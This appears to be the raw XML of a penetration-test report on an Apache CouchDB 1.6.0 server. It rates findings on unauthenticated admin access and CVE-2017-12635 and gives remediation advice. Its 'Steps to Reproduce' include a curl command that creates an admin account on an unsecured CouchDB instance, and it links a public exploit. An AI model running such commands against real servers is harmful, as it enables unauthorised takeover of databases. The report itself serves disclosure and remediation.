          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>exposes</w:t>
      </w:r>
      <w:r w:rsidR="00F83D6A">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> port 4369 for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F83D6A">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Erlang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Port Mapper Daemon. Which we currently do not expose.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C00E27" w:rsidRDefault="00C00E27">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">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rsidR="00F83D6A" w:rsidRPr="00F83D6A" w:rsidRDefault="00F83D6A" w:rsidP="00F83D6A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F83D6A">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Upgrade Apache Couch Db to v3.2.2 or later</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00382420" w:rsidRDefault="00F83D6A" w:rsidP="00382420">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Deploy</w:t>
      </w:r>
      <w:r w:rsidRPr="00F83D6A">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Network firewalls in front of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> installation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00382420" w:rsidRDefault="00382420" w:rsidP="00382420"/>
    <w:p w:rsidR="00382420" w:rsidRDefault="00382420" w:rsidP="00382420"/>
    <w:p w:rsidR="007739C0" w:rsidRDefault="007739C0" w:rsidP="007739C0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc143392741"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Finding 2: </w:t>
      </w:r>
      <w:r w:rsidRPr="007739C0">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007739C0">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007739C0">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Unauthenticated Administrative Access</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="red"/>
        </w:rPr>
        <w:t>CRITICAL</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007739C0" w:rsidRDefault="007739C0" w:rsidP="007739C0">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:tabs>
          <w:tab w:val="left" w:pos="6618"/>
        </w:tabs>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r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="007739C0" w:rsidRDefault="00EE004D" w:rsidP="007739C0">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Due to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> misconfiguration, anyone have access to the network will be able to access the DB with administrator privileges</w:t>
      </w:r>
      <w:r w:rsidR="00331EB1">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, also to </w:t>
      </w:r>
      <w:r w:rsidR="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">take over the database permissions. This is due to when create the database, we don’t set an administrator user, this lead to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002070FF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> will use admin party – everyone will have administrator permission. Hacker can utilize this misconfiguration to create an admin user and crash the admin pool so only the hacker will have admin privileges. Link refer: </w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:history="1">
        <w:r w:rsidR="002070FF" w:rsidRPr="00BF6DCD">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://guide.couchdb.org/draft/security.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF" w:rsidP="007739C0">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="007739C0" w:rsidRDefault="007739C0" w:rsidP="007739C0">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rsidR="007739C0" w:rsidRDefault="007739C0" w:rsidP="007739C0">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Access link: </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:history="1">
        <w:r w:rsidRPr="007C6340">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://10.10.10.10:5984</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="007739C0" w:rsidRDefault="007739C0" w:rsidP="007739C0">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Current Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> version: 1.6.0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007739C0" w:rsidRDefault="002070FF" w:rsidP="007739C0">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This vulnerability has</w:t>
      </w:r>
      <w:r w:rsidR="007739C0">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>executable curl commands:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007739C0" w:rsidRDefault="007739C0" w:rsidP="007739C0">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rsidR="007739C0" w:rsidRDefault="002070FF" w:rsidP="007739C0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Create dedicated admin user instead of using admin party</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007739C0" w:rsidRDefault="007739C0" w:rsidP="007739C0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="007739C0" w:rsidRDefault="007739C0" w:rsidP="007739C0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc143392742"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Steps to Reproduce</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:r>
        <w:t>1. Run the curl command:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="002070FF">
        <w:t>curl -X PUT http://</w:t>
      </w:r>
      <w:r>
        <w:t>10.10.10.10</w:t>
      </w:r>
      <w:r w:rsidRPr="002070FF">
        <w:t>:5984/_config/admins/admin -d '"admin"'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF"/>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:r>
        <w:t>2. Now only hacker will have the privileges to access the database with user: admin and password: admin</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007739C0" w:rsidRPr="007739C0" w:rsidRDefault="007739C0" w:rsidP="007739C0"/>
    <w:p w:rsidR="007739C0" w:rsidRDefault="007739C0" w:rsidP="00382420"/>
    <w:p w:rsidR="00382420" w:rsidRDefault="007739C0" w:rsidP="00382420">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc143392743"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Finding 3</w:t>
      </w:r>
      <w:r w:rsidR="00382420">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">: CVE-2017-12635 (Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00382420">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00382420">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt; 1.7.0</w:t>
      </w:r>
      <w:r w:rsidR="00842A49">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> and 2.x &lt; 2.1.1</w:t>
      </w:r>
      <w:r w:rsidR="00382420">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">) – </w:t>
      </w:r>
      <w:r w:rsidR="00C016F1" w:rsidRPr="00C016F1">
        <w:rPr>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="red"/>
        </w:rPr>
        <w:t>HIGH</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w:rsidR="00842A49" w:rsidRPr="00842A49" w:rsidRDefault="00842A49" w:rsidP="00842A49"/>
    <w:p w:rsidR="00842A49" w:rsidRDefault="00842A49" w:rsidP="002C1780">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:tabs>
          <w:tab w:val="left" w:pos="6618"/>
        </w:tabs>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r w:rsidR="002C1780">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00842A49" w:rsidRDefault="00842A49" w:rsidP="00842A49">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Due to differences in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Erlang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">-based JSON parser and JavaScript-based JSON parser, it is possible in Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> before 1.7.0 and 2.x before 2.1.1 to submit _</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> documents with duplicate keys for 'roles' used for access control within the database, including the special case '_admin' role, that denotes administrative users. In combination with CVE-2017-12636 (Remote Code Execution), this can be used to give non-admin users access to arbitrary shell commands on the server as the database system user. The JSON parser differences result in </w:t>
      </w:r>
      <w:r w:rsidR="00234CCD">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>behavior</w:t>
      </w:r>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> that if two 'roles' keys are available in the JSON, the second one will be used for </w:t>
      </w:r>
      <w:r w:rsidR="00234CCD">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>authorizing</w:t>
      </w:r>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the document </w:t>
      </w:r>
      <w:r w:rsidR="00234CCD">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>writer</w:t>
      </w:r>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, but the first 'roles' key is used for subsequent authorization for the newly created user. By design, users can not assign themselves roles. The vulnerability allows non-admin users to give themselves admin privileges.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00842A49" w:rsidRDefault="00842A49" w:rsidP="00842A49">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00842A49" w:rsidRDefault="00842A49" w:rsidP="00842A49">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rsidR="00842A49" w:rsidRDefault="00842A49" w:rsidP="00842A49">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Access link: </w:t>
      </w:r>
      <w:hyperlink r:id="rId17" w:history="1">
        <w:r w:rsidRPr="007C6340">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://10.10.10.10:5984</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00842A49" w:rsidRDefault="00842A49" w:rsidP="00842A49">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Current Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> version: 1.6.0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00842A49" w:rsidRDefault="00842A49" w:rsidP="00842A49">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This vulnerability has </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a public exploit execution code guidelines</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00842A49">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>https://github.com/assalielmehdi/CVE-2017-12635</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00842A49" w:rsidRDefault="00842A49" w:rsidP="00842A49">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00842A49" w:rsidRDefault="00842A49" w:rsidP="00842A49">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lastRenderedPageBreak/>
        <w:t>Recommendations:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00842A49" w:rsidRDefault="00842A49" w:rsidP="00842A49">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F83D6A">
        <w:rPr>
